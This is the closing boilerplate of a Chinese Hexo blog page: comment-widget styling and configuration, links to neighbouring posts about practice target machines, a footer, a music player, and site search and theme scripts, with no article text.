        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'ComjO6HnVsr1xOv8hNwQ8iXY-gzGzoHsz',
        appKey: 'jUr4hlk8CSkRFFeoyiMvBesp',
        serverURLs: 'https://comjo6hn.lc-cn-n1-shared.com',
        notify: 'true' === 'true',
        verify: 'true' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/11/21/Time/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Time">
                        
                        <span class="card-title">Time</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-11-21
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                    靶机
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/10/20/vulnhub9/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="vulnhub9">
                        
                        <span class="card-title">vulnhub9</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-20
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                    靶机
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">清风</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">70k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>









    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1111" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1111" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    

</body>

</html>
